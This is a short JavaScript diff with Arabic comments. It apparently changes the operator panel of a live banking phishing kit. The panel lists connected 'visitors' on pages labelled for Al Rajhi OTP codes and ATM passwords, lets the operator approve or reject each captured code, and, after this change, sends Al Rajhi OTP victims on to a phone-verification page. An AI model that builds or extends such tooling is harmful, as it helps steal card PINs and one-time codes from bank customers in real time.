@@ -1204,7 +1204,12 @@
             html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
             html += '</div>';
             html += '<div class="flex gap-2">';
-            html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+            // تغيير اسم زر الموافقة إلى "توثيق الجوال" لصفحة الراجحي OTP
+            if (dc.page === 'الراجحى (OTP)') {
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'phone-verification\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+            } else {
+              html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+            }
             html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
             // إضافة زر راجحي فقط إذا كانت الصفحة ATM والبطاقة تابعة للراجحي
             if (dc.page === 'كلمة مرور ATM' && isRajhiCard(visitor)) {
